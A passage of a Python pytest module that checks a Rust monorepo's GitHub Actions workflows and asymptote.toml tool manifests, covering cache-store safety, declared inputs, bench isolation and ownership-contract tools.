    store_steps(restored)[0][1].pop("if")
    assert store_problems("check", restored)
    unguarded_save = deepcopy(check)
    store_steps(unguarded_save)[1][1]["if"] = f"always() && {MAIN}"
    assert store_problems("check", unguarded_save)


# What a tool reads that is no file of the repository and no stamp holds: the event GitHub hands the run.
EVENT = re.compile(r"GITHUB_EVENT(_PATH)?\b")


def groups_run(job: dict, matrix_groups: set[str]) -> set[str]:
    """The groups a job's one check names: its `--groups` list, or every group of the matrix it takes the group from."""
    found: set[str] = set()
    for index in checks(job):
        matched = re.search(r"--groups (\S+)", job["steps"][index]["run"])
        if matched is None:
            continue
        written = matched[1]
        found |= matrix_groups if "${{" in written else set(written.split(","))
    return found


def event_store_problems(workflow: dict, tools: list[dict]) -> list[str]:
    """Each tool that reads the event whose group a job runs while it restores an asymptote store: its stored pass would outlive
    an edited pull request; and each such tool no job runs."""
    readers = {tool["id"]: tool["group"] for tool in tools if EVENT.search(" ".join(tool["run"]))}
    found = []
    matrix = workflow["jobs"].get("check", {}).get("strategy", {}).get("matrix", {}).get("check", [])
    matrix_groups = {group for row in matrix for group in row["groups"].split(",")} if isinstance(matrix, list) else set()
    for identity, group in sorted(readers.items()):
        running = [name for name, job in workflow["jobs"].items() if group in groups_run(job, matrix_groups)]
        if not running:
            found.append(f"{identity} reads the event, and no job runs its group {group}")
        found += [f"{identity} reads the event, and {name} restores a store for its group {group}" for name in running if store_steps(workflow["jobs"][name])]
    return found


def test_a_tool_that_reads_the_event_runs_where_no_store_is_kept() -> None:
    """The message main keeps (a pull request's title, a push's commits) is read from the event, which no stamp holds:
    commitizen's group is run by check.yml's pull-request job, which keeps no store, and by no job that restores one. Planted:
    commitizen in the root's stored repository group is refused."""
    tools = tomllib.loads(read(ROOT / "asymptote.toml"))["tools"]
    workflow = yaml.safe_load(read(DIRECTORY / "check.yml"))
    assert {tool["id"] for tool in tools if EVENT.search(" ".join(tool["run"]))} == {"commitizen"}
    assert event_store_problems(workflow, tools) == []
    assert groups_run(workflow["jobs"]["pull-request"], set()) == {"pull-request"} and not store_steps(workflow["jobs"]["pull-request"])
    stored = [tool | {"group": "repository"} if tool["id"] == "commitizen" else tool for tool in tools]
    assert event_store_problems(workflow, stored) == ["commitizen reads the event, and root restores a store for its group repository"]
    kept = deepcopy(workflow)
    kept["jobs"]["pull-request"]["steps"][-1:-1] = [deepcopy(step) for _, step in store_steps(workflow["jobs"]["root"])]
    assert event_store_problems(kept, tools)


def requires_receipts(job: dict) -> bool:
    """Whether the job's upload fails when its tools left no files."""
    return any(step.get("uses", "").startswith(UPLOAD) and step.get("with", {}).get("if-no-files-found") == "error" for step in job.get("steps", []))


def test_a_job_that_requires_its_receipts_restores_no_store_its_tools_cannot_refill() -> None:
    """Asymptote reuses a tool's result without the files its run wrote: a job whose upload requires them restores no store, so
    every tool of its group runs and writes them. No tool declares `outputs` (asymptote has no such key) that a store could put
    back, so the rule is that no such job restores one."""
    for manifest in [ROOT / "asymptote.toml", *listed(ROOT, "crates/*/asymptote.toml")]:
        assert all("outputs" not in tool for tool in tomllib.loads(read(manifest))["tools"]), manifest
    receipts = []
    for path in WORKFLOWS:
        for name, defined in yaml.safe_load(read(path))["jobs"].items():
            if requires_receipts(defined):
                receipts.append((path.name, name))
                assert not store_steps(defined), (path.name, name)
    assert receipts == [("benchmarks.yml", "bench-parity"), ("benchmarks.yml", "bench-measure"), ("check.yml", "bench-correctness")]
    warm = yaml.safe_load(read(DIRECTORY / "check.yml"))["jobs"]["bench-correctness"]
    key = f"asymptote-${{{{ runner.os }}}}-${{{{ runner.arch }}}}-ryo-bench-correctness-{TOOLHASH}-${{{{ github.run_id }}}}-${{{{ github.run_attempt }}}}"
    warm["steps"].insert(0, store_of({"steps": []}, "crates/ryo/.asymptote/cache", key)[0])
    assert requires_receipts(warm) and store_steps(warm)


# A persisted store reuses a tool while its stamp holds, and asymptote stamps a tool with its command line and its declared inputs
# alone. So a tool's inputs are coarse and safe, never minimal: a false skip is a wrong answer, an extra run only costs time.
# A tool's run that builds: a cargo build verb (a toolchain written before it, quoted or not), or a script that builds through
# cargo. One that also runs tests runs a test, nextest, llvm-cov, bench or run verb, or a script that does. A run that reads the
# path dependencies without building them: `cargo fmt --all` and cargo-deny.
BUILDS = re.compile(
    r"\bcargo(\s+\"?\+[^\s\"]+\"?)?\s+(build|check|test|nextest|clippy|doc|hack|llvm-cov|msrv|bench|run|package|dylint)\b"
    r"|sdk_api\.py|verify_profiles\.py|'cargo', '(build|test|run|bench)'"
)
TESTS = re.compile(r"\bcargo(\s+\"?\+[^\s\"]+\"?)?\s+(test|nextest|llvm-cov|bench|run)\b|verify_profiles\.py|'cargo', '(test|run|bench)'")
READS = re.compile(r"\bcargo fmt\b.*--all|cargo-deny")
# A run of `tm check` reads every tastemaker.lock of the repository: the whole tree.
TM = re.compile(r"(^|\s)tm check\b")
# What a workspace's tests read at run time beyond the packages cargo builds, each from the repository's top, swept by hand: a
# test that reads a file no path dependency reaches is invisible to cargo metadata, so it is named here, with the code that reads it.
RUN_TIME_READS = {
    "crates/ryo": [
        # cli/tests/replay/rule_fixtures.rs:40,49 reads the root's Tastemaker package.
        "tastemaker",
        # distribution/target_test.rs:99 installs crates/tastemaker/cli; cli/tests/fixtures/replay/targets/*/pin.toml copy
        # crates/tastemaker/distribution/registries/cargo/targets/*/tastemaker.lock.
        "crates/tastemaker",
    ],
    # cli/tests/replay/check.rs:325-356 checks a `git archive` of the repository's HEAD, and benchmark_fixture.rs:35-46 copies
    # every tastemaker.lock of the repository: tastemaker's tests read the whole tree.
    "crates/tastemaker": [""],
    # distribution/target_test.rs:102 installs crates/tastemaker/cli, which builds ryo's crates and reads the root's Tastemaker
    # packages, tastemaker/benchmarks among them, and the targets' pin.toml copy its fixtures: the whole tree.
    "crates/asymptote": [""],
    "tools/lints": [],
}


@functools.cache
def local_packages(workspace: Path) -> tuple[Path, ...]:
    """The directory of every package cargo resolves from a path for the workspace at `workspace`, its members and every path
    or patched dependency of theirs, read from `cargo metadata`, not from a resolver of our own."""
    command = ["cargo", "metadata", "--format-version", "1", "--manifest-path", str(workspace / "Cargo.toml")]
    if from_top(workspace) is not None:
        command.insert(4, "--locked")
    answered = subprocess.run(command, capture_output=True, text=True, check=True)
    packages = json.loads(answered.stdout)["packages"]
    return tuple(sorted({Path(os.path.normpath(Path(package["manifest_path"]).parent)) for package in packages if package["source"] is None}))


def run_paths(run: list[str], cwd: Path, top: Path) -> set[str]:
    """Every file or directory of the repository a tool's run names, a helper script or a library among them, from the top."""
    found = set()
    for token in (piece for argument in run for piece in re.split(r"[\s'\"=,()\[\];|<>&$]+", argument)):
        if not token or token.startswith("-") or any(character in token for character in "{}*?:"):
            continue
        target = Path(os.path.normpath(cwd / token))
        relative = os.path.relpath(target, top)
        if relative != "." and not relative.startswith("..") and target.exists():
            found.add(Path(relative).as_posix())
    return found


def benchy(tool: dict) -> bool:
    """Whether a tool measures: a bench, perf or memory group. It reads its own product and pinned external targets alone, and what its
    run builds; it runs no test, so it reads nothing at run time beyond that."""
    group = tool.get("group", "")
    return group in ("perf", "memory") or group.startswith("bench")


# What a bench tool may name outside its product: the toolchain, and the helper that installs a pinned tool. The Tastemaker package of
# benchmark rules, `tastemaker/benchmarks`, is the policy the pinned targets are checked with and is kept for no other purpose.
BENCH_ALLOWED = {"rust-toolchain.toml", ".cargo", "clippy.toml", "rustfmt.toml", "tools/install.py", "tastemaker/benchmarks"}
PRODUCTS_AT = ("crates/ryo", "crates/tastemaker", "crates/asymptote")
# A distribution bench installs the Tastemaker command and prepares each target's policy with the Tastemaker package, and the one
# release step that does so for ryo and asymptote has no pinned release of it yet: the two tools below may name those, and no other tool
# and no other path (a follow-up pins the released command and the policy, and this entry goes).
BENCH_READS_TASTEMAKER = {("crates/ryo", "performance-distribution"), ("crates/asymptote", "performance-distribution")}


def bench_reaches(product: Path, top: Path = ROOT, tools: list[dict] | None = None) -> list[str]:
    """Each path a bench, perf or memory tool of the asymptote.toml at `product` names in its inputs or its run that is not its own
    product's, a package its build resolves, or one of `BENCH_ALLOWED`, `<tool>: <path>`: another product's directory, the repository's
    root or its definitions. A measure over a repository's own tree is the workload this stops."""
    at = Path(os.path.relpath(product, top)).as_posix()
    own = local_packages(product)
    packages = {Path(os.path.relpath(each, top)).as_posix() for each in own}
    found = []
    for tool in tools if tools is not None else tomllib.loads(read(product / "asymptote.toml"))["tools"]:
        if not benchy(tool):
            continue
        pieces = (piece for argument in tool["run"] for piece in re.split(r"[\s'\"=,()\[\];|<>&$]+", argument))
        # A word of the run names a path only when it is relative, has a directory and exists from the product's directory.
        runs = [piece for piece in pieces if "/" in piece and not piece.startswith(("/", "-")) and "^" not in piece and (product / piece.split("{")[0]).exists()]
        named_here = [*tool.get("inputs", ["."]), *runs]
        for each in named_here:
            if any(character in each for character in "{}*?:") or each.startswith("-"):
                each = re.split(r"[{}*?:]", each)[0].rstrip("/") or "."
            relative = Path(os.path.relpath(os.path.normpath(product / each), top)).as_posix()
            relative = "" if relative == "." else relative
            if relative.startswith(".."):
                found.append(f"{tool['id']}: {each}")
                continue
            if relative == at or relative.startswith(at + "/") or any(relative == name or relative.startswith(name + "/") for name in BENCH_ALLOWED):
                continue
            if (at, tool["id"]) in BENCH_READS_TASTEMAKER and (relative in ("tastemaker", "crates/tastemaker") or relative.startswith(("tastemaker/", "crates/tastemaker/"))):
                continue
            other = next((name for name in PRODUCTS_AT if relative == name or relative.startswith(name + "/")), None)
            inside_package = any(relative == each or relative.startswith(each + "/") for each in packages)
            above_package = any(each.startswith(relative + "/") for each in packages)
            if other is not None and relative != other and (inside_package or above_package):
                continue
            found.append(f"{tool['id']}: {relative or '.'}")
    return sorted(set(found))


@pytest.mark.parametrize("product", ["crates/ryo", "crates/tastemaker", "crates/asymptote"])
def test_a_bench_tool_reads_only_its_own_product_and_pinned_targets(product: str) -> None:
    """A product's bench, perf and memory tools measure its own directory and pinned external targets: none names another product,
    the repository's root or its definitions in its inputs or its run, beyond the packages its own build resolves."""
    assert bench_reaches(Path(os.path.normpath(ROOT / product))) == []


def test_a_bench_tool_that_reaches_another_product_or_the_root_is_named() -> None:
    """The reach this stops, planted on tools as they stood when Tastemaker's benches measured `tm` over ryo and the repository's own
    definitions: each of the paths below is named, and a tool outside the bench groups is not held to it."""
    tastemaker = ROOT / "crates/tastemaker"
    before = {
        "id": "memory-commands",
        "group": "memory",
        "run": ["taskset", "-c", "0-3", "cargo", "bench", "--package", "idiomatic-sh-tastemaker", "--bench", "commands", "--", "--memory"],
        "inputs": [".", "../ryo", "../../tastemaker", "../../rust-toolchain.toml", "../../.cargo", "../.."],
    }
    assert bench_reaches(tastemaker, tools=[before]) == ["memory-commands: .", "memory-commands: crates/ryo", "memory-commands: tastemaker"]
    assert bench_reaches(tastemaker, tools=[{**before, "group": "check"}]) == []
    ryo = ROOT / "crates/ryo"
    measure = {"id": "bench-measure", "group": "bench-measure", "run": ["cargo", "run", "--", "measure-valid"], "inputs": [".", "../tastemaker", "../../tastemaker"]}
    assert bench_reaches(ryo, tools=[measure]) == ["bench-measure: crates/tastemaker", "bench-measure: tastemaker"]
    assert bench_reaches(ryo, tools=[{**measure, "run": ["cargo", "run", "--manifest-path", "../tastemaker/Cargo.toml"], "inputs": ["."]}]) == [
        "bench-measure: crates/tastemaker/Cargo.toml"
    ]


def unnamed_inputs(product: Path, top: Path = ROOT, tools: list[dict] | None = None, reads: dict | None = None) -> list[str]:
    """Each path a tool of the asymptote.toml at `product` stands on that none of its literal inputs names, `<tool>: <path>`.
    Every tool: each file its run names. A tool that builds: every package cargo resolves for the workspace it builds, whatever
    its test filter selects (with `--workspace` cargo builds every member, and a filter only picks the tests that run), the
    repository's rust-toolchain.toml and .cargo; one that runs tests, also what that workspace's tests read at run time. A tool
    that reads the path dependencies without building them: those packages. `tools` and `reads` stand in for the file's and
    `RUN_TIME_READS`."""
    reads = RUN_TIME_READS if reads is None else reads
    found = []
    for tool in tools if tools is not None else tomllib.loads(read(product / "asymptote.toml"))["tools"]:
        written = " ".join(tool["run"])
        inputs = [Path(os.path.relpath(os.path.normpath(product / each), top)).as_posix() for each in tool.get("inputs", ["."])]
        inputs = ["" if each == "." else each for each in inputs]
        required = run_paths(tool["run"], product, top)
        if TM.search(written):
            required.add("")
        if BUILDS.search(written) or READS.search(written):
            manifest = re.search(r"--manifest-path\s+(\S+)/Cargo\.toml", written)
            workspaces = [Path(os.path.normpath(product / manifest[1])) if manifest else product]
            library = re.search(r"--path\s+(\S+)", written)
            if library and (product / library[1] / "Cargo.toml").is_file():
                workspaces.append(Path(os.path.normpath(product / library[1])))
            for workspace in workspaces:
                required |= {Path(os.path.relpath(each, top)).as_posix() for each in local_packages(workspace)}
                if BUILDS.search(written):
                    required |= {"rust-toolchain.toml", ".cargo"}
                if TESTS.search(written) and not benchy(tool):
                    required |= set(reads.get(Path(os.path.relpath(workspace, top)).as_posix(), []))
        found += [f"{tool['id']}: {path or '.'}" for path in sorted(required) if not named(path, inputs)]
    return found


@pytest.mark.parametrize("product", ["crates/ryo", "crates/tastemaker", "crates/asymptote", "."])
def test_every_tool_names_everything_it_builds_runs_and_reads(product: str) -> None:
    """A persisted store reuses a tool while its inputs did not move, so each tool names every file its run names, every package
    cargo builds for it, and what its tests read at run time."""
    assert unnamed_inputs(Path(os.path.normpath(ROOT / product))) == []


def test_a_dependency_of_a_dependency_is_required(tmp_path: Path) -> None:
    """Cargo's metadata reaches a dependency of a dependency and a dev-dependency of a member, and a `--workspace` build needs
    every member whatever the test filter names."""
    (tmp_path / "rust-toolchain.toml").write_text("")
    (tmp_path / ".cargo").mkdir()
    product = tmp_path / "crates/demo"
    for name in ("a", "b", "c", "d", "outside"):
        (product / name / "src").mkdir(parents=True)
        (product / name / "src/lib.rs").write_text("")
    (product / "Cargo.toml").write_text('[workspace]\nmembers = ["a", "b", "d"]\nresolver = "3"\n')
    (product / "a/Cargo.toml").write_text('[package]\nname = "a"\nedition = "2024"\n[dependencies]\nb = { path = "../b" }\n')
    (product / "b/Cargo.toml").write_text('[package]\nname = "b"\nedition = "2024"\n[dependencies]\nc = { path = "../c" }\n')
    (product / "c/Cargo.toml").write_text('[package]\nname = "c"\nedition = "2024"\n')
    (product / "d/Cargo.toml").write_text('[package]\nname = "d"\nedition = "2024"\n[dev-dependencies]\noutside = { path = "../outside" }\n')
    (product / "outside/Cargo.toml").write_text('[package]\nname = "outside"\nedition = "2024"\n')
    tool = {"id": "test-a", "group": "check", "run": ["cargo", "nextest", "run", "--workspace", "-E", "package(=a)"]}
    every = ["a", "b", "c", "d", "outside", "Cargo.toml", "../../rust-toolchain.toml", "../../.cargo"]
    assert unnamed_inputs(product, tmp_path, [tool | {"inputs": every}], {}) == []
    for dropped, missing in (("c", "crates/demo/c"), ("d", "crates/demo/d"), ("outside", "crates/demo/outside")):
        inputs = [each for each in every if each != dropped]
        assert unnamed_inputs(product, tmp_path, [tool | {"inputs": inputs}], {}) == [f"test-a: {missing}"]


def test_a_tool_that_misses_what_it_runs_or_reads_is_named() -> None:
    """Each class of a stale stored pass, planted on the real tools: a member the `--workspace` build compiles but the test
    filter does not name; a file the tests read at run time; a helper the run executes; and a capture input, which names
    nothing to the guard."""
    ryo = ROOT / "crates/ryo"
    tools = {tool["id"]: tool for tool in tomllib.loads(read(ryo / "asymptote.toml"))["tools"]}
    narrow = ["Cargo.toml", "Cargo.lock", ".config", "languages/{lang}", "crates/language", "crates/sdk", "../../rust-toolchain.toml", "../../.cargo"]
    missing = unnamed_inputs(ryo, tools=[{**tools["test-language"], "inputs": narrow}])
    assert "test-language: crates/ryo/cli" in missing and "test-language: crates/ryo/crates/execution" in missing
    assert "test-language: crates/ryo/languages/python" in missing
    distribution = tools["test-distribution"]
    unread = unnamed_inputs(ryo, tools=[{**distribution, "inputs": [each for each in distribution["inputs"] if each != "../tastemaker"]}])
    assert unread == ["test-distribution: crates/tastemaker"]
    clippy = tools["cargo-clippy"]
    helper = "../../ci/scripts/checks/cargo_diagnostics.py"
    unrun = unnamed_inputs(ryo, tools=[{**clippy, "inputs": [each for each in clippy["inputs"] if each != helper]}])
    assert unrun == ["cargo-clippy: ci/scripts/checks/cargo_diagnostics.py"]
    tastemaker = ROOT / "crates/tastemaker"
    (cli,) = [tool for tool in tomllib.loads(read(tastemaker / "asymptote.toml"))["tools"] if tool["id"] == "test-cli"]
    partial = unnamed_inputs(tastemaker, tools=[{**cli, "inputs": [".", "../ryo", "../../tastemaker", "../../rust-toolchain.toml", "../../.cargo"]}])
    assert partial == ["test-cli: ."]
    # `tm check` reads every tastemaker.lock: asymptote's tastemaker tool with its round-2 inputs misses the tree.
    asymptote = ROOT / "crates/asymptote"
    (checked,) = [tool for tool in tomllib.loads(read(asymptote / "asymptote.toml"))["tools"] if tool["id"] == "tastemaker"]
    assert unnamed_inputs(asymptote, tools=[{**checked, "inputs": [".", "../../tastemaker"]}]) == ["tastemaker: ."]


def test_every_file_a_row_reads_is_an_input_of_ci_tests() -> None:
    """ci-tests' stamp is its inputs: every repository file this module reads goes through `read`, and every listing through
    `listed`, which refuse a path no input of the root's ci-tests tool names; no other function of the module reads a file."""
    source = read(Path(__file__))
    allowed = {"read", "listed"}
    found = []
    for node in ast.parse(source).body:
        name = node.name if isinstance(node, ast.FunctionDef) else None
        for call in ast.walk(node):
            if not isinstance(call, ast.Call):
                continue
            function = call.func
            reading = (isinstance(function, ast.Attribute) and function.attr in {"read_text", "read_bytes", "open", "glob", "rglob", "iterdir"}) or (
                isinstance(function, ast.Name) and function.id == "open"
            )
            if reading and name not in allowed:
                found.append(f"{name or 'module'}:{call.lineno}")
    assert found == []
    read(ROOT / "asymptote.toml")
    given = read.inputs  # type: ignore[attr-defined]
    try:
        read.inputs = ["ci", "asymptote.toml"]  # type: ignore[attr-defined]
        with pytest.raises(AssertionError, match="crates/ryo/tastemaker.lock"):
            read(ROOT / "crates/ryo/tastemaker.lock")
        with pytest.raises(AssertionError, match="crates/ryo/README.md"):
            listed(ROOT / "crates/ryo", "README.md")
    finally:
        read.inputs = given  # type: ignore[attr-defined]


TEST_CORE = "test-core"
OWNERSHIP = {
    "test-boundary-contract": [
        "cargo", "nextest", "run", "--workspace", "--locked", "--all-features", "--no-tests=fail", "--run-ignored", "all", "-E",
        "package(=idiomatic-sh-ryo-execution) & kind(test) & binary(=boundary_contract)",
    ],
    "test-execution-use-case": [
        "cargo", "nextest", "run", "--workspace", "--locked", "--all-features", "--no-tests=fail", "--run-ignored", "all", "-E",
        "package(=idiomatic-sh-ryo-execution) & kind(lib) & test(/^inbound::use_cases::execution::/)",
    ],
    "test-benches": ["cargo", "test", "--workspace", "--locked", "--benches", "--exclude", "idiomatic-sh-ryo-*-*-benchmark"],
}


def ownership_problems(tools: list[dict]) -> list[str]:
    """What keeps ryo's ownership contracts from running as check tools: a required suite that may list no test or skips its
    ignored tests, an operators doctest listing that may come back empty, a package under crates/ no test-core filter names, a
    linter bench package with no test-bench, and the bench targets run otherwise than in test mode with the default features
    (the `distribution` bench left out by them), the linter workers excluded."""
    found = []
    by_id = {tool["id"]: tool for tool in tools}
    for identity, run in OWNERSHIP.items():
        tool = by_id.get(identity, {})
        if tool.get("group") != "check" or tool.get("run") != run:
            found.append(f"{identity} must run {run} in group check")
    operators = by_id.get("test-operators-doc", {})
    script = " ".join(operators.get("run", []))
    if operators.get("group") != "check" or "set -euo pipefail" not in script or not script.endswith("listing=$(cargo \"+$nightly\" test --locked --all-features -p idiomatic-sh-ryo-operators --doc -- --list); grep -Eq ': test$' <<< \"$listing\""):
        found.append("test-operators-doc must fail when the operators crate lists no doctest")
    filtered = set(re.findall(r"package\(=([\w-]+)\)", " ".join(by_id.get(TEST_CORE, {}).get("run", []))))
    packages = {tomllib.loads(read(manifest))["package"]["name"] for manifest in listed(ROOT / "crates/ryo/crates", "*/Cargo.toml")}
    found += [f"test-core runs no test of {name}" for name in sorted(packages - filtered)]
    bench = by_id.get("test-bench", {})
    if bench.get("group") != "check" or "--no-tests=fail" not in bench.get("run", []) or "package(=idiomatic-sh-ryo-{lang}-{linter}-benchmark)" not in bench.get("run", []):
        found.append("test-bench must run each linter bench package's tests, failing when it lists none")
    return found


def test_ryo_ownership_contracts_are_check_tools() -> None:
    """The ownership contracts the old hand-written job ran are ryo's check tools: the boundary contract and execution use case
    suites with their ignored tests, failing when empty; the operators crate's doctests, listed; every package under crates/
    in test-core; each linter bench's tests; every bench target in test mode."""
    tools = tomllib.loads(read(ROOT / "crates/ryo/asymptote.toml"))["tools"]
    assert ownership_problems(tools) == []
    by_id = {tool["id"]: tool for tool in tools}
    changes = [
        ("test-boundary-contract", lambda tool: tool["run"].remove("--no-tests=fail")),
        ("test-execution-use-case", lambda tool: tool["run"].remove("--run-ignored")),
        ("test-benches", lambda tool: tool["run"].append("--all-features")),
        ("test-benches", lambda tool: tool["run"].__delitem__(slice(-2, None))),
        ("test-operators-doc", lambda tool: tool["run"].__setitem__(2, tool["run"][2].replace("; grep -Eq ': test$' <<< \"$listing\"", ""))),
        # `grep -q` on the pipe quits at its first match, and the rustdoc writing the rest of the list fails on the closed pipe.
        ("test-operators-doc", lambda tool: tool["run"].__setitem__(2, tool["run"][2].replace("listing=$(cargo", "cargo").replace("--list); grep -Eq ': test$' <<< \"$listing\"", "--list | grep -Eq ': test$'"))),
        (TEST_CORE, lambda tool: tool["run"].__setitem__(-1, tool["run"][-1].replace(" | package(=idiomatic-sh-ryo-relations)", ""))),
        ("test-bench", lambda tool: tool["run"].remove("--no-tests=fail")),
    ]
    for identity, change in changes:
        changed = deepcopy(tools)
        change(next(tool for tool in changed if tool["id"] == identity))
        assert ownership_problems(changed), identity
    assert all(by_id[identity]["group"] == "check" for identity in [*OWNERSHIP, "test-operators-doc", "test-bench", TEST_CORE])
    # No workflow runs a check by hand beside asymptote: no tm and no cargo step.
    for path in WORKFLOWS:
        for name, defined in yaml.safe_load(read(path))["jobs"].items():
            for step in defined["steps"]:
                assert not re.search(r"(^|\s)(tm|cargo)\s", step.get("run", "")), (path.name, name, step.get("run"))


BENCH_VERBS = {
    "bench-correctness": ("verify-inventory", "bench-correctness"),
    "bench-parity": ("parity", "bench-parity"),
    "bench-measure": ("measure-valid", "bench-measure"),
}
BENCH = "languages/{lang}/benchmarks/linters/{linter}"
COLLECTOR = ["cargo", "run", "--locked", "--release", "-p", "idiomatic-sh-ryo-benchmark", "--bin", "ryo-benchmark-collector", "--"]
# The worker's case verbs run on the bench's root profile, not each rule's settings profile: no tool runs them through the
# collector, and bench-correctness covers every case under its rule's own profile.
WORKER_CASE_VERBS = {"verify-cases", "verify-reference-cases"}


def bench_verb_problems(tools: list[dict]) -> list[str]:
    """What keeps a linter bench's verb from being a tool expanded per bench: a verb with no tool, a tool in another group, or a
    run that is not the collector's verb over the captured bench directory; and any tool that runs the collector with a worker
    case verb."""
    found = []
    by_id = {tool["id"]: tool for tool in tools}
    for identity, (verb, group) in BENCH_VERBS.items():
        tool = by_id.get(identity, {})
        run = [*COLLECTOR, verb, BENCH]
        if tool.get("group") != group or tool.get("run") != run or BENCH not in tool.get("inputs", []):
            found.append(f"{identity} must run the collector's {verb} over each bench, in group {group}")
    for tool in tools:
        run = tool.get("run", [])
        if run[: len(COLLECTOR)] == COLLECTOR and len(run) > len(COLLECTOR) and run[len(COLLECTOR)] in WORKER_CASE_VERBS:
            found.append(f"{tool['id']}: a worker case verb runs on the bench profile, not each rule's settings profile")
    return found


def test_every_bench_verb_is_a_tool_per_bench() -> None:
    """Every verb of every linter bench is a tool of ryo's asymptote.toml, expanded per bench directory, so a new bench gets each
    with no edit."""
    tools = tomllib.loads(read(ROOT / "crates/ryo/asymptote.toml"))["tools"]
    assert bench_verb_problems(tools) == []
    one_bench = deepcopy(tools)
    correctness = next(tool for tool in one_bench if tool["id"] == "bench-correctness")
    correctness["run"][-1] = "languages/python/benchmarks/linters/ruff"
    other_group = deepcopy(tools)
    next(tool for tool in other_group if tool["id"] == "bench-measure")["group"] = "perf"
    case_verb = deepcopy(tools)
    cases = deepcopy(next(tool for tool in case_verb if tool["id"] == "bench-correctness"))
    cases.update({"id": "bench-cases", "group": "bench-cases", "run": [*COLLECTOR, "verify-cases", BENCH]})
    case_verb.append(cases)
    for changed in (one_bench, other_group, case_verb):
        assert bench_verb_problems(changed)


def test_bench_parity_and_measure_run_only_by_hand() -> None:
    """benchmarks.yml, started only by hand, runs ryo's bench-parity and bench-measure groups, one job each, each uploading the
    receipts its tools wrote; check.yml runs neither."""
    workflow = yaml.safe_load(read(DIRECTORY / "benchmarks.yml"))
    assert triggers(workflow) == {"workflow_dispatch"}
    for group in ("bench-parity", "bench-measure"):
        job = workflow["jobs"][group]
        assert "if" not in job and "needs" not in job and "strategy" not in job
        assert [step["run"] for step in job["steps"] if "asymptote check" in step.get("run", "")] == [f"asymptote check --root crates/ryo --groups {group}"]
        upload = job["steps"][-1]
        assert upload["uses"].startswith(UPLOAD) and upload["if"] == "always()"
        assert upload["with"] == {
            "name": f"{group}-${{{{ github.run_attempt }}}}",
            "path": "target/benchmark/",
            "include-hidden-files": True,
            "if-no-files-found": "error",
            "retention-days": 7,
        }
    check = read(DIRECTORY / "check.yml")
    assert "bench-parity" not in check and "bench-measure" not in check
